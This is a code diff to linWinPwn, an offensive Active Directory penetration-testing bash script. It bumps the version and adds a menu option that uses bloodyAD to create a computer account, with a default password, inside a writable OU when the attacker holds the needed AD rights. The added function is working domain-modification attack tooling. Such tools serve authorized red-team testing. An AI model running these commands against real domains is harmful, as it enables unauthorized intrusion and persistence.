@@ -156,7 +156,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.3.6 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.7 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -3589,6 +3589,35 @@ add_computer() {
     echo -e ""
 }
 
+add_computer_ou() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
+            read -rp ">> " host_addcomp </dev/tty
+            if [[ ${host_addcomp} == "" ]]; then host_addcomp="WS3000"; fi
+            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
+            read -rp ">> " pass_addcomp </dev/tty
+            if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
+            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
+            echo -e "${CYAN}[*] Example: OU=Computers,DC=domain,DC=local${NC}"
+            read -rp ">> " ou_addcomp </dev/tty
+            while [ "${ou_addcomp}" == "" ]; do
+                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
+                read -rp ">> " ou_addcomp </dev/tty
+            done
+            echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp} to OU ${ou_addcomp}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}' --ou '${ou_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 dnsentry_add() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
@@ -6537,6 +6566,7 @@ modif_menu() {
     echo -e "2) Add user to group (Requires: ${PURPLE}AddMember${NC} on group)"
     echo -e "3) Remove user from group (Requires: ${PURPLE}AddMember${NC} on group)"
     echo -e "4) Add new computer (Requires: MAQ > 0)"
+    echo -e "4ou) Add new computer to a custom OU location (Requires: MAQ > 0 and ${PURPLE}GenericWrite${NC} on OU)"
     echo -e "5) Add new DNS entry (Requires: Modification of DNS)"
     echo -e "6) Enable account (Requires: ${PURPLE}GenericWrite${NC})"
     echo -e "7) Disable account (Requires: ${PURPLE}GenericWrite${NC})"
@@ -6583,6 +6613,12 @@ modif_menu() {
         add_computer
         modif_menu
         ;;
+
+    4ou)
+        add_computer_ou
+        modif_menu
+        ;;
+
 
     5)
         dnsentry_add
